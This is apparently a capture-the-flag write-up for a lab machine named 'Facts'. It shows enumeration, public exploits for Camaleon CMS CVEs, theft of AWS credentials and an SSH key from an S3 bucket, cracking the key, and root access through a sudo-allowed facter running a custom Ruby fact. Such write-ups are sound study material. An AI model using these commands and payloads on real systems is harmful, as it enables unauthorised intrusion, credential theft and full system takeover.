# FACTS
## Enumeration
### Nmap
As always we start with a quick nmap scan
```bash
nmap -sV T4 <IP>
```
this was the result
```bash
Host is up (0.053s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.26.3 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
### Web
We see port 80 is hosting a website, so let's head over there and add `facts.htb` to our `/etc/hosts`.  
The website seems to be hosting random facts about stuff. We see that there are people making comments, but we don't see an option to create an account, so lets try to find it.  
At this point you could use a tool like `ffuf` to fuzz for directories, but i just tried `/admin` and got redirected to `/admin/login` which allows us to create an account, so let's make one.  
<br>
After making an account and loggin in, we see an admin dashboard, but we are very limited because we don't have admin privilages.  
At the bottom footer we see that the website is using `Camaleon CMS v2.9.0` a quick google search shows that this version is vulnerable to `CVE-2024-46987` (arbitrary file read) and `CVE-2025-2304` (authenticated user privilage escalation).  
<br>
## Exploitation
We can use this exploit for [file read](https://github.com/Goultarde/CVE-2024-46987) and this exploit for [privilage escalation](https://github.com/predyy/CVE-2025-2304).  
```bash
python3 exploit.py -u http://facts.htb -l <USER> -p <PASSWORD> -v <FILE>
```
This allows us to view any file on the target machine.  
First thing I checked is `/etc/passwd`
```bash
python3 exploit.py -u http://facts.htb -l <USER> -p <PASSWORD> -v /etc/passwd
```
We find 2 users `william` and `trivia`.  
<br>
Now let's use `CVE-2025-2304` and become website admin.
```bash
python3 exploit1.py http://facts.htb <USER> <PASSWORD>
```
Exploit should be executed successfully
```bash
[*] Submitting password change request
[+] Submit successful, you should be admin
```
We can now view the admin dashboard. After looking around for a bit the only interesting thing I found were AWS credentals in filesystem settings.  
### AWS
Let's download `aws-cli` and add those credentials to a profile and view the bucket.
```bash
aws configure set aws_access_key_id <ACCESS_KEY> --profile facts && \
aws configure set aws_secret_access_key <SECRET_KEY> --profile facts && \
aws configure set region us-east-1 --profile facts && \
aws configure set output json --profile facts && \
aws configure set s3.addressing_style path --profile facts
```
Now let's list all buckets
```bash
aws s3 ls --profile facts --endpoint-url http://facts.htb:54321
2025-09-11 14:06:52 internal
2025-09-11 14:06:52 randomfacts
```
I checked `randomfacts` bucket, and it's just pictures, but `internal` is more interesting.
```bash
aws s3 ls s3://internal --profile facts --endpoint-url http://facts.htb:54321
                           PRE .bundle/
                           PRE .cache/
                           PRE .ssh/
2026-01-08 19:45:13        220 .bash_logout
2026-01-08 19:45:13       3900 .bashrc
2026-01-08 19:47:17         20 .lesshst
2026-01-08 19:47:17        807 .profile
```
`.ssh/` is the most promising, so lets check it
```bash
aws s3 ls s3://internal/.ssh/ --profile facts --endpoint-url http://facts.htb:54321
2026-02-11 22:37:40         82 authorized_keys
2026-02-11 22:37:40        464 id_ed25519
```
Yep, we find a ssh key. Let's download and crack it.
```bash
aws s3 cp s3://internal/.ssh/id_ed25519 . --profile facts --endpoint-url http://facts.htb:54321
```
Now lets use `ssh2john` to extract the hash (`ssh2john` should be installed with `john`)
```bash
python3 ssh2john.py id_ed25519 > hash.txt
john hash.txt
```
After literally 5 minutes, we get a hit.  
Let's try to ssh into the machine.  
`william` is not working, so let's try `trivia`.
```bash
sh -i id_ed25519 trivia@facts.htb
Enter passphrase for key 'id_ed25519':
```
We successfully logged in.  
Now let's grab the user flag from `/home/william/user.txt`
```bash
cat /home/william/user.txt`
```
### Root
Now that we have a user shell, let's get root.
First, let's check what are we allowed to run with sudo
```bash
trivia@facts:~$ sudo -l
Matching Defaults entries for trivia on facts:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
trivia@facts:~$
```
We can run `/usr/bin/facter` as root without password. `facter` is Ruby based and allows loading custom facts from user-controlled directories via the `--custom-dir=` option. Since it runs as root under `sudo`, any Ruby code inside a loaded fact will execute with root privileges.
```bash
trivia@facts:/tmp$ cat << 'EOF' > /tmp/stigs.rb
> Facter.add(:pwned) do
> setcode do
> system("/bin/bash")
> end
> end
> EOF
```
Now this:
```bash
trivia@facts:/tmp$ sudo /usr/bin/facter --custom-dir=/tmp
root@facts:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
root@facts:/tmp#
```
We got root, and we can read root flag
```bash
cat /root/root.txt
```
